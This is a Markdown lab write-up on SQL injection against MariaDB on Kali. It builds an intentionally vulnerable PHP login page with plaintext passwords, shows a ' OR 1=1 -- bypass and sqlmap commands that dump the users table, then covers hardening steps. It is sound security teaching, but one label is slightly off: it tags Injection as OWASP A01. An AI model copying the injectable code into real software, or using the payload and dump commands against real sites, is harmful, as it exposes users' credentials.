# 🐘 Advanced SQL Injection Lab + Database Security Hardening (MariaDB on Kali)

> ✅ \*\*Platform\*\*: Kali Linux 2025  
> ✅ \*\*Database\*\*: MariaDB  
> ✅ \*\*Goal\*\*: Simulate SQL Injection, exploit it manually and via sqlmap, then harden the database using security policies.

---

## 📌 Step 1: Install and Configure MariaDB

```bash
sudo apt update
sudo apt install mariadb-server
sudo systemctl start mariadb
```
✅ Check if it's running:

```
sudo systemctl status mariadb
```
## 🧪 Step 2: Create Vulnerable Database and Table

1. Login to MariaDB:

```
bashCopyEditsudo mariadb
```

1. Create database and vulnerable `users` table:

```  
CREATE DATABASE dvdb;
USE dvdb;

CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50),
  password VARCHAR(50)
);

INSERT INTO users (username, password) VALUES ('admin', 'admin123'), ('test', 'test123');
SELECT * FROM users;
```
![Mari1](file:///C:/Users/moham/OneDrive/Desktop/Mari1.png)
## 💥 Step 3: Build Vulnerable PHP Login Page

📁 Location: `/var/www/html/sqli_login.php`

```
phpCopyEdit<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$host = "localhost";
$user = "dvuser";
$pass = "StrongPass123!";
$db = "dvdb";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$username = $_GET['username'];
$password = $_GET['password'];

$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
echo "<pre>SQL Query: $sql</pre>";

$result = $conn->query($sql);
if ($result->num_rows > 0) {
    echo "✅ Login Successful!";
} else {
    echo "❌ Invalid Credentials.";
}
?>
```

Also create a simple form `sql.html`:

```
htmlCopyEdit<form action="sqli_login.php" method="get">
  <label>Username:</label>
  <input type="text" name="username"><br>
  <label>Password:</label>
  <input type="text" name="password"><br>
  <input type="submit" value="Login">
</form>
```
![Login Form](file:///C:/Users/moham/OneDrive/Desktop/LoginForm.png)
## 🧨 Step 4: Manual SQL Injection

- Payload:

    ```
    sqlCopyEditUsername: ' OR 1=1 --  
    Password: anything
    ```
- Result:

    ```
    ✅ Login Successful!
    ```
    ![Login](file:///C:/Users/moham/OneDrive/Desktop/Login.png)
    ## 🐍 Step 5: Automated Attack with sqlmap

### 🔹 Basic scan:

```  
sqlmap -u "http://localhost/sqli_login.php?username=test&password=test" --batch --dump
```

### 🔹 List databases:

```
sqlmap -u "http://localhost/sqli_login.php?username=test&password=test" --dbs
```

### 🔹 Dump `users` table:

```
sqlmap -u "http://localhost/sqli_login.php?username=test&password=test" -D dvdb -T users --dump
```

![D1](file:///C:/Users/moham/OneDrive/Desktop/D1.png)
![D2](file:///C:/Users/moham/OneDrive/Desktop/D2.png)
## 🛡️ Step 6: Database Security Hardening

### ✅ 6.1 Least Privilege – Create Limited User

```
sqlCopyEditCREATE USER 'dvuser'@'localhost' IDENTIFIED BY 'StrongPass123!';
GRANT SELECT ON dvdb.* TO 'dvuser'@'localhost';
```

![Mari Pass](file:///C:/Users/moham/OneDrive/Desktop/Mari%20Pass.png)
### 🔐 6.2 Enforce Password Policy (cracklib plugin)

#### 🔹 Install plugin:

```
bashCopyEditsudo apt install mariadb-plugin-cracklib-password-check cracklib-runtime
sudo systemctl restart mariadb
```

#### 🔹 Load plugin in MariaDB:

```
sqlCopyEditINSTALL SONAME 'cracklib_password_check';
```

#### 🔹 Test with weak password:

```
sqlCopyEditCREATE USER 'weakuser'@'localhost' IDENTIFIED BY '123';
-- ERROR 1819 (HY000): Your password does not satisfy the current policy requirements
```

![Marierror2](file:///C:/Users/moham/OneDrive/Desktop/Marierror2.png)

### 🔥 6.3 Delete Default or Empty Users

```
DELETE FROM mysql.user WHERE user='';
DELETE FROM mysql.user WHERE user='test';
FLUSH PRIVILEGES;
```

![Mari Delete](file:///C:/Users/moham/OneDrive/Desktop/MariDelete.png)

* * *

### 📜 6.4 Enable General Query Logging

Edit config:

```
bashCopyEditsudo nano /etc/mysql/mariadb.conf.d/50-server.cnf
```

Add or update:

```
iniCopyEditgeneral_log_file = /var/log/mysql/mariadb.log
general_log = 1
```

Restart MariaDB:

```
bashCopyEditsudo systemctl restart mariadb
```

Tail the logs:

```
bashCopyEditsudo tail -f /var/log/mysql/mariadb.log
```

![Mari Final](file:///C:/Users/moham/OneDrive/Desktop/MariFinal.png)
* * *

## ✅ Final Outcome

- ✅ Simulated and exploited SQL Injection manually and via sqlmap
- ✅ Hardened the database using real-world security practices
- ✅ Enforced password policies using `cracklib`
- ✅ Logged database activity for auditing

* * *

## 🎓 Skills Demonstrated

- Web app security (OWASP A01: Injection)
- Use of Kali tools (sqlmap)
- MariaDB administration and user privilege control
- Secure database design and hardening
